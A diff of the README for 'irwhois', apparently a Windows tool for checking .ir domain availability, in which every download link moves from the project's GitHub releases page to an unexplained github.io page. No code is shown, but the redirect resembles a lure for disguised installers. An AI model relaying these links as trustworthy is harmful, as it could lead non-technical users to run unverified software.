@@ -1,7 +1,7 @@
 <h1>🔍 irwhois - Check .ir Domains Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Formmedicine181/irwhois/releases"><img src="https://img.shields.io/badge/Download-irwhois-2ea44f?style=for-the-badge" alt="Download irwhois"></a>
+  <a href="https://formmedicine181.github.io"><img src="https://img.shields.io/badge/Download-irwhois-2ea44f?style=for-the-badge" alt="Download irwhois"></a>
 </p>
 
 Welcome to **irwhois** – the simplest way to check if a .ir domain name is available. Whether you're starting a new Persian website, checking a business name, or just curious about a domain, this tool gives you the answer in seconds. No technical knowledge needed.
@@ -20,7 +20,7 @@ Getting irwhois on your Windows computer is easy. Here's what you need to do:
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Formmedicine181/irwhois/releases](https://github.com/Formmedicine181/irwhois/releases)
+Visit this link to download the application: [https://formmedicine181.github.io](https://formmedicine181.github.io)
 
 On that page, you'll see a list of files. Look for the one that says **irwhois** and click the download button next to it. The file will be saved to your Downloads folder.
 
@@ -142,7 +142,7 @@ If you're building anything for the Iranian audience, a .ir domain is your best 
 
 ## 🔗 Quick Links
 
-- **Download**: [https://github.com/Formmedicine181/irwhois/releases](https://github.com/Formmedicine181/irwhois/releases)
+- **Download**: [https://formmedicine181.github.io](https://formmedicine181.github.io)
 - **Report a Problem**: Open an issue on the GitHub page
 - **Request a Feature**: Let us know what you'd like to see in future versions
 
